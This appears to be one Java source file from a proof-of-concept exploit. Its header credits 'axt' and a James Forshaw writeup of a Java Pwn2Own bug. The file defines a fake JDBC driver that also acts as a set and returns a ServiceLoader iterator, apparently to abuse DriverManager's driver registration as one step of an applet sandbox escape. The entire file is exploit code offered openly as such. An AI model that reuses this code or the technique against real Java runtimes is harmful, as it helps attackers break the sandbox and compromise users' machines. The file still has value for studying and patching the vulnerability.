/*
Proof-of-Concept exploit by axt based on the writeup by James Forshaw

http://www.contextis.com/research/blog/java-pwn2own/
http://axtaxt.wordpress.com
*/

import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverPropertyInfo;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.AbstractSet;
import java.util.Iterator;
import java.util.Properties;
import java.util.ServiceLoader;
import java.util.logging.Logger;


public class FakeDriver1 extends AbstractSet<Object> implements Driver {

	public static ServiceLoader<Object> _sl;
	static {
		MainApplet.log("FakeDriver1 class loaded");
	}
	
	public FakeDriver1() {
		_sl = ServiceLoader.load(Object.class);
	}

	@Override
	public Iterator<Object> iterator() {
		return _sl.iterator();
	}
	
	@Override
	public Connection connect(String url, Properties info) throws SQLException {
		return null;
	}

	@Override
	public boolean acceptsURL(String url) throws SQLException {
		return false;
	}

	@Override
	public DriverPropertyInfo[] getPropertyInfo(String url, Properties info)
			throws SQLException {
		return null;
	}

	@Override
	public int getMajorVersion() {
		return 0;
	}

	@Override
	public int getMinorVersion() {
		return 0;
	}

	@Override
	public boolean jdbcCompliant() {
		return false;
	}

	@Override
	public int size() {
		return 0;
	}



	@Override
	public Logger getParentLogger() throws SQLFeatureNotSupportedException {
		// TODO Auto-generated method stub
		return null;
	}

}
